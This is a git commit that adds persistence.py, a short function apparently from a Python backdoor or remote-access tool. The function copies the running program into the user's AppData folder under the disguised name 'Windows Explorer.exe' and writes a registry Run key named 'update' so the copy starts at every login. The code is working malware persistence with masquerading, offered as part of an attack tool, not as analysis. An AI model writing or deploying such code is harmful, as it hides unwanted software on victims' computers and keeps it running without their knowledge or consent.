b4c195a4078578c4badefd1d794b8d382e88d04c
Darshil Desai <32188374+dexter-morgan@users.noreply.github.com>
2018-12-24 21:33:56 +0530

    Create persistence.py

---
+++ persistence.py
@@ -0,0 +1,5 @@
+def become_persistent(self):
+		evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+		if not os.path.exists(evil_file_location):
+			shutil.copyfile(sys.executable, evil_file_location)
+			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
